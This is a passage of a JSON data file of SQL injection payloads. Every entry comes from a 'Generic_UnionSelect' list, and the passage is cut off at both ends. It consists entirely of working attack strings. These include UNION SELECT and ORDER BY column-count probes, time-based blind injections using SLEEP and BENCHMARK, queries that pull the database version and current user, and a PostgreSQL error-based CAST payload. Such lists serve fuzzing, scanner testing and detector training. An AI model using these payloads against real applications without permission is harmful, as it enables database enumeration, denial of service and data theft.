    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),\"'3",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),\"'3'\"#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A'))",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "AND 3516=CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516=3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC)",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX'",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX'#",
    "category": "sql injection",
    "source_file": "Generic_UnionSelect.txt"
  },
  {
    "payload": "UNION ALL SELECT 'INJ'||'ECT'||'XXX',2#",
    "category": "sql injection",
